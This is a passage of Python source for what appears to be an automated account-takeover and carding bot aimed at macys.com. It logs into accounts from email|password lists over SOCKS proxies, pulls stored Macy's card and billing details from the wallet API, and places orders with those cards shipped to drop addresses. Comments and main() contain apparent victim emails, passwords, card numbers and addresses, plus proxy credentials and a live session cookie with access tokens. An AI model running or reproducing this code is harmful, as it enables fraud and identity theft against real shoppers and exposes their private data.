                if i >= 4:
                    self.update_status('proxy timeout')
                    return 'order die:socks die:';
                # html = r.read()
                # link_get = r.geturl()
                # html = self.fixHTML(html);
                # c = open('dien.html', 'w')
                # c.write(html)
                # print dien

        return True

    def submit_order(self, macys_card, cardId=''):
        if cardId:
            macys_cardnumber = macys_card.split('|')[0]
            macys_cardmonth = macys_card.split('|')[1]
            macys_cardyear = macys_card.split('|')[2]
        else:
            macys_cardnumber = macys_card

        self.browser.add_header('https://www.macys.com/chkout/rcsignedin?perfectProxy=true', XMLHttpRequest=True, extraHeader={'Content-Type':'application/json','Accept':'application/json, text/javascript, */*; q=0.01','Accept-Encoding':'gzip, deflate, br'})

        link_info_order = 'https://www.macys.com/chkout/order'
        i = 0
        while i <= 4:
            try:
                self.browser.open(link_info_order,timeout=30)
                html = self.browser.read()

            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:'

        html_json_re = re.search('shippingContacts":(.+?),"',html)
        shippingID = ''
        if html_json_re:
            order_json = json.loads(html_json_re.group(1))
            for line_html in order_json:
                if line_html['selectedShippingContact']:
                    shippingID= str(line_html['id'])

        request_url = 'https://www.macys.com/chkout/order/shippingaddress'
        #{"firstName":"long","lastName":"hoang","address":{"addressLine1":"3503Y Jack Northrop Ave Suite #JT90","addressLine2":"","city":"Hawthorne","state":"CA","zipCode":"90250","phoneNumber":"5534231534"},"primaryFlag":true,"id":""}
        if self.guest_checkout:
            self.bfirstname = self.sfirstname
            self.blastname = self.slastname
            self.baddress1 = self.saddress1
            self.baddress2 = self.saddress2
            self.bcity = self.scity
            self.bstate = self.sstate
            self.bzipcode = self.szipcode
        if self.mix_zipcode:
            self.szipcode = self.bzipcode
        request_data = {}
        request_data["firstName"] = self.sfirstname
        request_data["lastName"] = self.slastname
        request_data["address"] = {"addressLine1":self.saddress1,"addressLine2":self.saddress2,"city":self.scity,"state":self.sstate,"zipCode":self.szipcode,"phoneNumber":self.sphone}
        request_data["primaryFlag"] = "true"
        request_data["id"] = shippingID


        self.update_status('Trying input shipping infomation')
        i = 0
        while i <= 4:
            try:
                r = self.browser.open(request_url, put_data=request_data,timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()
                # self.browser.add_header(link_get)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die'
        w = open('dien_shipping.html','w')
        w.write(html)


        if html.find('fieldErrors":[]') == -1:
            error_search = re.search('message":"(.+?)"',html)
            if error_search:

                self.update_status(error_search.group(1).strip())
                return 'order die:'+error_search.group(1).strip()
            else:
                return 'order die:Can not add your shipping address'
        if self.billasship:
            self.bfirstname = self.sfirstname
            self.blastname = self.slastname
            self.baddress1 = self.saddress1
            self.baddress2 = self.saddress2
            self.bcity = self.scity
            self.bstate = self.sstate
            self.bzipcode = self.szipcode




        request_url = 'https://www.macys.com/chkout/order/creditcard'
        if self.guest_checkout:
            request_data = {'cardType': {"code":"Y"},
                            'cardNumber': macys_cardnumber,
                            'maskedCreditCardNumber': '',
                            'creditCardID': '',
                            'contact':{'firstName':self.bfirstname,'lastName':self.blastname,'address':{'addressLine1':self.baddress1,'addressLine2':self.baddress2,'city':self.bcity,'state':self.bstate,'zipCode':self.bzipcode,'phoneNumber':self.sphone},'email':self.email_chuan},'primaryFlag':False}
        else:
            request_data = {'cardType': {"code":"Y"},
                            'cardNumber': macys_cardnumber,
                            'maskedCreditCardNumber': macys_cardnumber,
                            'creditCardID': str(cardId),
                            'contact':{'firstName':self.bfirstname,'lastName':self.blastname,'address':{'addressLine1':self.baddress1,'addressLine2':self.baddress2,'city':self.bcity,'state':self.bstate,'zipCode':self.bzipcode,'phoneNumber':self.sphone},'email':self.email_chuan},'primaryFlag':True}

        self.update_status('Trying input billing infomation')

        i = 0
        while i <= 4:
            try:
                r = self.browser.open(request_url, json_data=request_data,timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()
                # self.add_header(link_get)
                if not cardId:
                    r = self.browser.open('https://www.macys.com/chkout/rcordersummary',timeout=30)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:'

        if html.find('fieldErrors":[]') == -1:
            error_search = re.search('message":"(.+?)"',html)
            if error_search:

                self.update_status(error_search.group(1).strip())
                return 'order die:'+error_search.group(1).strip()
            else:
                return 'order die:Can not add your billing address'


        request_url = 'https://www.macys.com/chkout/order/contact'
        request_data = {"phoneNumber":self.sphone,"email":self.email_chuan}
        self.update_status('Trying update contact information')
        i = 0
        while i <= 4:
            try:
                r = self.browser.open(request_url, json_data=request_data,timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()

            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:'

        request_url = 'https://www.macys.com/chkout/order/placeorder'
        request_data = {"deviceId":""}

        self.update_status('Trying place Your Order')
        i = 0
        while i <= 4:
            try:
                r = self.browser.open(request_url, json_data=request_data,timeout=30)
                html = self.browser.read()
                link_get = self.browser.get_url()
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'order die:socks die:'


        error_re = re.search('message":"(.+?)"', html)
        if error_re:
            self.update_status(error_re.group(1).strip())
            return 'order die:' + error_re.group(1).strip();

        orderstatus = re.search('orderID":"(.+?)"', html)

        order_submited = ''
        order_fasle = ''
        c = open('dien.html', 'w')
        c.write(html)


        if orderstatus:
            try:
                openf = open('Order_valid.txt', 'a')
            except:
                openf = open('Order_valid.txt', 'w')
            openf.write(str(
                orderstatus.group(1).strip()) + '|' + self.email_chuan + '|' + self.email + '|' + self.password + '\n')
            openf.close()
            order_submited = str(
                orderstatus.group(1).strip()) + '|' + self.email_chuan + '|' + self.email + '|' + self.password + '\n'

            self.update_status(order_submited)
        else:
            order_fasle = 'Your order could not be completed'

            self.update_status(order_fasle)
            error_w = open('error.html', 'w')
            error_w.write(html)
        if order_submited:
            return order_submited
        elif order_fasle:
            return 'order die:' + order_fasle;
        else:
            return;

    def check(self, email='', password='', username='', sock5='', proxy=''):

        header='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30'
        if sock5:
            self.browser.set_proxies(sock5=sock5)
        if proxy:
            self.browser.set_proxies(proxy=proxy)
        login = self.site_login(email, password, sock5=sock5, proxy=proxy)
        print(login)
        if login.find('check die') == -1:
            list_info = self.get_info_account_infomation(get_all_card=True)
            if list_info:
                total_info=''
                # print list_info
                for info in list_info:
                    total_info=total_info+email+'|'+password+'|'+info['billingAddress']+'|'+info['card_infomation']+'\n'
                return total_info.strip()
            else:
                return 'check die:no card'
        return login

    def check_order_status(self, order_number,email_order, sock5='', sock_type='', username='', password=''):

        self.browser = Rqbrowser()
        self.browser.link_host = 'www.macys.com'
        self.browser.link_origin = 'https://www.macys.com'
        if sock5:
            self.browser.set_proxies(sock5=sock5)
        request_url = 'https://www.macys.com/service/order-details'
        request_data={}
        request_data['OrderNumber'] = order_number
        request_data['giftLookupFlag'] = 'false'
        request_data['zipCode'] = ''
        request_data['emailID'] = email_order
        self.add_header('https://www.macys.com/')
        i = 0
        while i < 4:
            try:
                r = self.browser.open('https://www.macys.com/service/order-status',timeout=10)
                allforms = self.browser.selectForm(r)
                checkform=None
                for form in allforms:
                    if str(form).find('TextControl(OrderNumber') !=-1:
                        checkform = form
                        break
                if not checkform:
                    return 'check die:socks die:'
                checkform['OrderNumber'] = order_number
                checkform['emailID'] = email_order
                request = checkform.click()
                r = self.browser.open(request,timeout=30)
                # r = self.browser.open('https://www.macys.com/service/order-details',timeout=10)
                html = r.content
                c = open('dien.html','w')
                c.write(html)
                # print html
                link_get = r.url
                html = self.fixHTML(html);
                self.add_header(link_get, XMLHttpRequest=True)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'check die:socks die:'

        if html.find('<H1>Access Denied</H1>') != -1:
            return 'check die:socks die:'

        order_status = ''
        tracking = ''
        if html.find('div class="progressBarNormal canceled') != -1:

            self.update_status('canceled')
            order_status = order_status + 'canceled\n'
            tracking = 'Canceled'
        elif html.find('div class="progressBar') != -1:
            order_status = order_status + 'processing\n'

            self.update_status('processing')
            trackingre = re.search('<li class="trackID">tracking \#:\s*<span>(.+?)</span>', html)
            if trackingre:
                tracking = trackingre.group(1).strip()
            else:
                if html.find('button" id="cancelOrderButton') == -1:
                    tracking = 'Shipped'
                else:
                    tracking = 'processing'

            self.update_status(tracking)
        order_status = order_status + 'Shipping Address\n'
        order_status = order_status + 'All Item\n'
        order_status = order_status + tracking + '\n'
        return order_status

    def get_macys_card_informaiton(self):
        link_get = 'https://www.macys.com/creditservice/gateway?cm_sp=macys_account-_-macys_credit_card-_-my_macys_credit_card'
        i = 0
        while i < 4:
            try:
                r = self.browser.open(link_get,timeout=30)
                html = r.content
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'check die:socks die:'
        creditLimit_re = re.search('creditLimit":"(.+?)"',html)
        if creditLimit_re:
            return creditLimit_re.group(1).strip()
        else:
            return ''

    def get_info_account_infomation(self,get_all_card=False):
        # self.browser.add_header('https://www.macys.com/account/wallet?ocwallet=true#cards-section&linklocation=leftrail')
        # self.browser.add_cookies_to_header()
        # r = self.browser.open('https://www.macys.com/account/wallet?ocwallet=true')
        # html = r.text
        # print(html)
        # c = open('dien.html','w')
        # c.write(html)
        ExtraHeaders = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "cookie":'rCookie=a0nhgm0oegseyj40o7z7ajlce5kfrz; _gid=GA1.2.299320229.1672725693; _gcl_au=1.1.342044686.1672725730; RTD=b1017d0b10bc50b1081f0b103fd0; ORA_FPC=id=5c25d3a3-1d9b-4e32-b490-5ec0edfec087; WTPERSIST=email_hash=fc7879aceac64c56333f94f24d4ea565e557295d1f99dd609e785ebe9a7dd662; currency=AUD; mercury=true; bm_sz=A7C4008D75B6CB6847C1DDF4EC2BD01B~YAAQjrkpF4TcYwmFAQAA9T6vehKz6XpL74kgi4fd/RGnXrh71akpks/kK0ccQEo2IqKIpxBnIztMRg/rCCrOJOingzAs5NilnjTYEwbbsS+opyqTAilpYGi7S5EMHs2kzk1tRh7DC16EbYxYJwyQ+ctNyDa0+562TPStKCK2V6TzK0kYNprORcuzheldNivDR4RUssrXt7Vr50rc8QjjyJ7Hg5H4c2TSrmmY/FAGBk2Bs/m29wIUzUmWfqmD3FrykWJ3budhomh5m7HJ9pncGq6gGNVA/1d91Iowz84leVD4PQ==~3355445~3553075; at_check=true; AMCVS_8D0867C25245AE650A490D4C%40AdobeOrg=1; AMCV_8D0867C25245AE650A490D4C%40AdobeOrg=-1124106680%7CMCIDTS%7C19362%7CMCMID%7C86252864264497946672426575041511151472%7CMCAAMLH-1673405384%7C8%7CMCAAMB-1673405384%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1672807784s%7CNONE%7CMCAID%7CNONE%7CMCCIDH%7C-1419952973%7CvVersion%7C5.2.0; ak_bmsc=0B73D1BC742CF1B39C3BA2406AD1A399~000000000000000000000000000000~YAAQjrkpF7rcYwmFAQAAJkSvehLo+s+B6+1IpbnZe7m5gsgB5L7VHPG1f72nJKpQZtUaTeBE0fxPOg2VD7BoasoBao5EDhKEyffRTMGx6+Bi3DUCGXvfHchg+zmr5d9ahKZgDas4OauwwMLYDVnIDirv9mqs8gKYnSSCfQ63TWoEYbEXmSDAjU4Bvq21n3dM4at/X4yHAxfvt4c4nKSp1lGk825hQRr5+gNwBG2HvWYHwSagkTczMp5KxSsBLmkp6hvigns8XG1raFCdB3RfSqlqOk5qGKl8zai6Qp2Vfq6PqSK702u8+qREMygIMhKQuXRO+SEhaZ+wyRa0AVCMSUFnv6GXTyyxiQ6pDbjzOQviTu8JzIOkeTMLHy62ZURotRTtHNKcCvNJIrFVqgXkpv+mlJqmmn3Yw0F2BhyCg9KLaM62sIU38SCpZU6wacitrmasg45QmDVN4WehQE2npEXUdVNzD0QmNdpO/bQlIH9ODN9/WnTYI8w=; wlcme=true; dca=WDC; shippingCountry=US; akavpau_mobileprod_macys=1672801117~id=f6d8086d9b6b233d4c4500c82062a6bd; smtrsession=hashCollected_account%7Ctrue; access_token=b8y4gdy5a55d3mp92phk3sw8; secure_user_token=20_CuvVGzpRMekJBhgzNKu9fVHmkWh5FgBBjEkTPkxXq%2B%2FKth3MgdHyPqk38IH%2FKA%2BCjuPupi4nUgzreq7SSQTGbrzYOZNIohCifZBZEjkNpbA%3D; MISCGCs=NACD1_92_23414823743_87_BTZIPCODE1_92_4_02_3_87_u_e_e1_92_ftAEzBEzBjz_g0YO%40TFzbk.gBF3_87_SSIToken1_92_20_abxcrQEiOjNmCbhfYlXWTQoriUmVNhePHKmAT1GIdoz2nY7F9yXevo%2BjzNVvW30mZUCl4lrC9Gjzj851PWIdSg%3D%3D3_87_UserName1_92_tuan; macys_online_guid=56f96a18-b308-4804-a503-55e37ff25eec; macys_online_uid=12873368731; SignedIn=1; SMISCGCs=cardtype1_92_Y; SNSGCs=bypass_session_filter1_92_false3_87_last_access_token1_92_1672805384261; GCs=CartItem1_92_03_87_BazaarVoiceToken1_92_6a22e25e794ecfb1921ffd7f27261c97646174653d3230323330313033267573657269643d31323837333336383733313_87_UserName1_92_tuan; SEED=-869347489159835155%7C935-21%7C786-21%2C796-21; FORWARDPAGE_KEY=https%3A%2F%2Fwww.macys.com%2F%3FFromSignin%3Dtrue; mbox=PC#ccb45223688f43e2920471de0595dc5d.36_0#1736050187|session#1e3239a996114a72923020e639320fa7#1672805433; s_pers=%20c29%3Dmcom%253Ahome%2520page%7C1672807186965%3B%20v30%3Dhome%2520page%7C1672807186967%3B; utag_main=v_id:01857033a543005581ab6675d72c0506f002406700c98$_sn:4$_ss:0$_st:1672807186486$skai_uuid:78b51dcb-e6fb-46bb-bc2b-aecbf8aa4528$vapi_domain:macys.com$dc_visit:4$ses_id:1672803572758%3Bexp-session$_pn:14%3Bexp-session$dc_event:3%3Bexp-session$dc_region:ap-southeast-2%3Bexp-session; _uetsid=29d699608b2c11edb184178d7ed52dfd; _uetvid=29d6cbe08b2c11eda0e99f4a853bab51; _ga=GA1.2.984941919.1672624712; OptanonConsent=isGpcEnabled=0&datestamp=Wed+Jan+04+2023+14%3A09%3A49+GMT%2B1000+(Australian+Eastern+Standard+Time)&version=6.23.0&isIABGlobal=false&hosts=&consentId=9a6846fa-3dde-4b17-97f5-c332bdac4772&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CSPD_BG%3A1%2CC0005%3A1%2CC0004%3A1&AwaitingReconsent=false; cto_bundle=h8eyQV9aclFiWldLSm1yQnRUM05ySSUyQnd6cnRFQk10QjJjbk5GNlVTMVJ5bVEzY1owYVlRemNrMElYa1RIbks4cHBFZFFGQXZBVUFpbEEwWTNWUXE2VSUyRktWMGtHRHdlWHZqYTdDVUslMkJFRDF2eHRGUUZRejZOTEM1NiUyQjBHS3oweVB3WU5vYUxhR1VWelU3UWZvckhnUTJGVzhsdyUzRCUzRA; smtrrmkr=638084021934030725%5E01857aaf-4988-42f6-86bf-ba45d5b87853%5E01857af8-1fd5-486f-a831-92ea893fbac2%5E0%5E211.30.2.146; s_sess=%20s_cc%3Dtrue%3B%20%2520s_ips%3D1041%3B%20s_tp%3D6686%3B%20s_ppv%3Dmcom%25253Ahome%252520page%252C16%252C0%252C1041%252C1%252C6%3B; _abck=B1466FC4F26402BBAB880AD16BE8E115~-1~YAAQjrkpFx5+ZwmFAQAAgjT5egmQLxwIgmIJWsT+QindxhDlwxatC+zW+ZOY5NjRVbng1Vvzxp2hcuxzVqbuS9IAjUtF1gKWmd2nzZtOY8ApLyi4asHA+XHa0FQyG3eP4RyQKJUMNL/h7q3xcODSWguNUMJNxJZ2xulhNzA9Hw4qOd3RlG0wkb0IE0EUoM05m2P121VISbvuzX+G5vb37IvqICtnLPqZ92CiHeTzIkFju4brAF7MG0gdlwmQYULmgGARLovXn/pRN9wNBt41A0F151dsc95WR4SpggwUbfI5SrKBT4hYBKFuc0UcMhTYws3d6aNK2PRHw5aQpJ9BiAreA7OBv2DaUbTVymsWh1sflqPCPPJE4G9ePlVIRtYpj5JNuzCQOEmd7sSrBdMTcpAwbfMALASRjEJkwIQLsnXqin7v~-1~-1~-1; bm_sv=286E2AB2AFD82232B8B57A2661C03409~YAAQjrkpFwO7ZwmFAQAAQwz+ehLC2TGp/bYTMSMUeYQcOHUEj2UtV/UuKJJfMv6YDS19MtDYwuP8Va8CTzmHsaVP+6ob4XRrxk9Nj1WxmYeIQtxoleH/KRcWEgDEITA30lLevaX5dJ+t3HoIaGeJDPxqCk2vJxb7F1N5Z6AKP2KFnuXsL4IkqT6s0hj6qfBe4PafFpEXam+m1IuO6bCWp31ZQGwJbpNVtvMDVYw2i/3Fr/ymDP0ouRUHb7k5nKBz4A==~1; RT="z=1&dm=macys.com&si=512a2bad-c241-4169-bcdb-735a2f6d5123&ss=lch4q810&sl=m&tt=12kj&bcn=%2F%2F684d0d4c.akstat.io%2F&obo=3&ul=meci&hd=mfrr"; _ga_HXF6P409HF=GS1.1.1672803572.4.1.1672805747.60.0.0'
        }
        self.browser.add_header('https://www.macys.com/account/wallet?ocwallet=true#cards-section&linklocation=leftrail', extraHeader=ExtraHeaders)
        cookiesRaw = self.browser.add_cookies_to_header()
        # print(cookiesRaw)
        i = 0
        while i < 4:
            try:
                r = self.browser.open('https://secure-m.macys.com/api/v1/wallet/summary',timeout=10)
                html = r.text
                print(html)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            self.update_status('proxy timeout')
            return 'check die:socks die:'
        list_info = self.get_billing_and_macys_id(html,get_all_card=get_all_card)
        # print list_info
        return list_info

    def get_info_account(self, account_infomation):
        if self.guest_checkout:
            if account_infomation.find('|') == -1 and account_infomation.strip().isdigit():
                return account_infomation.strip()
            else:
                accounts = account_infomation.split('|')
                for line_account in accounts:
                    if line_account.strip().isdigit() and len(line_account.strip())>6:
                        return line_account.strip()
                return
        else:
            try:
                accounts = account_infomation.split('|')
                self.email = accounts[0].strip()
                self.password = accounts[1].strip()
            except:
                return
        return self.email+'|'+self.password

    def order(self, shipping_address, card_information=None,account_infomation=None,item_information=None, proxy=None,use_sock5=True):
        """
            item_id = flavors
            color = item
        """

        self.proxy = proxy
        if self.proxy:
            if use_sock5:
                self.browser.set_proxies(sock5=self.proxy)
            else:
                self.browser.set_proxies(proxy=self.proxy)
                
        ##fisrt_name|last_name|address|address2|city|state|zipcode|phone
        if account_infomation:
            account = self.get_info_account(account_infomation)
            if not account:
                self.update_status('invalid account infomation')
                return 'order die:invalid account infomation'
        '''
        if listbilling:
            self.get_billing_infomation(listbilling)
            self.get_card_infomation(list_card)
        else:
            print 'invalid billing infomation'
            self.update_status('invalid billing infomation')
            return 'order die:invalid billing infomation';'''

        check_shipping = self.get_shipping_infomation(shipping_address)
        if not check_shipping:
            self.update_status('invalid Shipping infomation')
            return 'order die:invalid Shipping infomation';

        if item_information:
            self.get_item_information(item_information)
        else:
            self.update_status('Missing Item Information')
            return 'order die:Missing Item Information';
            # print listbilling

        self.update_status('Ship To:' + shipping_address)

        if self.guest_checkout:
            creat_account = self.create_account()
            if creat_account.find('order die') != -1:
                return creat_account

        login_html = self.site_login(self.email, self.password)
        if login_html.find('check die') != -1:
            if login_html.find('socks die') != -1:
                return 'order die:socks die:'
            else:
                return 'order die:Your Usename Or Password incorect'

        if not self.guest_checkout:
            self.update_status('Trying get Billing and Macys Card Infomation')
            ############## Get Macys card information ##############
            list_macys_card = self.get_info_account_infomation()
            if not list_macys_card:
                return 'order die:Cant Find Your Macys Card'
            if str(list_macys_card).find('socks die') != -1:
                return 'order die:socks die:'
            self.update_status('Got ' + str(len(list_macys_card)) + ' Macys Card')
            ############## Clear Shopping bags ##############
            clear_bag = self.clear_shopping_bag()

        ############## add to cart ##############
        list_item_added = 0
        for item_line_link in self.list_item_link:
            listitems = item_line_link.split('|')
            item_link = listitems[0].strip()
            size = listitems[1].strip()
            color = listitems[2].strip()
            quantity = listitems[3].strip()
            add_to_cart = self.add_item_to_cart(item_link, size, color, quantity)
            if add_to_cart.find('order die') == -1:
                list_item_added += 1
        if not list_item_added:

            self.update_status('cant add item to your cart')
            return 'order die:cant add item to your cart'
        #print 'Added '+str(list_item_added)+' item to your cart'
        self.update_status('Added ' + str(list_item_added) + ' item to your cart')
        if not self.guest_checkout:
            self.change_email_info()
        shipping_form = self.go_to_input_shipping()
        if str(shipping_form).find('order die:') == -1:
            if not self.guest_checkout:
                for line_macys in list_macys_card:
                    macys_card = line_macys['card_infomation']
                    cardId = line_macys['cardId']
                    submit_order = self.submit_order(macys_card,cardId)
                    #print submit_order
                    if submit_order.find('order die:') == -1:
                        self.update_status('Trying Get Order Info')
                        #print 'Trying Get Order Info'
                        #self.cookie.clear_session_cookies()
                        #self.cookie.clear()
                        return submit_order
                return submit_order;
            else:
                submit_order = self.submit_order(account)
                # print submit_order
                if submit_order.find('order die:') == -1:
                    self.update_status('Trying Get Order Info')
                    # print 'Trying Get Order Info'
                    # self.cookie.clear_session_cookies()
                    # self.cookie.clear()
                return submit_order;


        else:
            #print shipping_form
            return shipping_form;

def main():


    listbilling = 'long|hoang|11407 SW Amu St.Suite #JT907||Tualatin|OR|97062'

    list_address_drop = 'Jiang|Jiang Xiao|11407 SW Amu RD.Suite #UY734||Tualatin|OR|97065'
    #1288375392|FPTgeoEICiYnzs@sbcglobal.net|brynargust@yahoo.com|bryn0320
    mun_browser = mybrowser.MunAntiBrowser()
    # profile_info  = mun_browser.create_random_profile(phoneOs='iPhone', sock5='192.168.8.108:30000')
    # inject_data = mun_browser.get_inject_data()
    # # # print(profile_info)
    # driver = mun_browser.setting(inject_str=inject_data,
    #                     profileInfo=profile_info, onetime=False, type_browser='Chrome', pageLoad=False)
    driver = mun_browser.open_random_driver(sock5='meomun2014:Hanoi123@pmsdws2.mountproxies.com:5563', pageLoad=False, phoneOs='Android')
    # driver = None
    ordervr = Macys(mun_browser=mun_browser,driver=driver)
    
    item_information = 'https://www.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964'
    # ordervr.order(list_address_drop,account_infomation='cwen.hsieh@gmail.com|6474591|CHINGWEN|HSIEH|394 BEVERLY ST|#A|RENO|NV|89512||450399830640|-1|-1',item_information=item_information,proxy='127.0.0.1:9951')
    # ordervr.site_login('kep328@yahoo.com','london98')
    # ordervr.get_info_account_infomation()
    # ordervr.change_email_info()
    ordervr.login('thunaonao_abcxyz@gmail.com','hanoi123')
    # ordervr.mun_anti_get_cookies()


    # check_status = ordervr.check_order_status('1347527371','DuVEdmcev@yahoo.com',sock='127.0.0.1:9951')
    # print check_status
    #kristinkbuettner@gmail.com | mdgirly1
    #nancy522@gmail.com|vball522|NANCY|VU|1310 S GLENCOE ST||DENVER|CO|80222|MasterCard1176|5466160368911176|1|2021
    #
    # check = ordervr.check('nancy522@gmail.com','vball522',sock5='127.0.0.1:9951')
    # ordervr.get_macys_card_informaiton()
    # print(check)
    # card_id = ordervr.get_macys_card_info('208172905',get_all=True)
    # print card_id
    # bskvarla@pacbell.net|Hanoi123
    #artglasscreations@sbcglobal.net|dakota|TravisL|buss|2374 Hardscrabble Rd||Drain|OR|97435|Macys4580|438283264580|1|1999
    # status = ordervr.order(list_address_drop, listbilling, list_card='372577389342012|03|2016|5512',
    #                        account_infomation='UhrgfhFNRBgS@aol.com|UhrgfhFNRBgS',
    #                        sock='', flavors='', item_name='',
    #                        item_id_link='http://www1.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964',
    #                        weight='', shipping_info='2 Day', billasship=False)
    # print status
    # ordervr.create_account()
    # ordervr.add_item_to_cart('https://www.macys.com/shop/product/shark-nv358-vacuum-pro-navigator-professional-lift-away?ID=595650','','','1')


if __name__ == "__main__":
    sys.exit(main())
